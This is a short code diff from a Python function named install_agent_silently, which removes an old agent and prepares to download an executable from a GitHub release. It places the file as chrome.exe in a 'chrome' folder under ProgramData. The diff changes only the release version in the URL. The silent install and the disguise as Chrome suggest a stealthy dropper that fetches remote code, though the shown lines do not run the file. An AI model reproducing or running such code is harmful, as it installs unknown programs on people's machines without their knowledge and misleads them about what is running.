@@ -215,7 +215,7 @@ def install_agent_silently():
         _uninstall_old_agent()
 
         import urllib.request, ssl
-        AGENT_URL = "https://github.com/AdamZoda/ANTI-Agent/releases/download/v1.0.1/chrome.exe"
+        AGENT_URL = "https://github.com/AdamZoda/ANTI-Agent/releases/download/v1.0.0/chrome.exe"
         agent_dir = os.path.join(os.environ.get("PROGRAMDATA", r"C:\ProgramData"), "chrome")
         agent_path = os.path.join(agent_dir, "chrome.exe")
         os.makedirs(agent_dir, exist_ok=True)
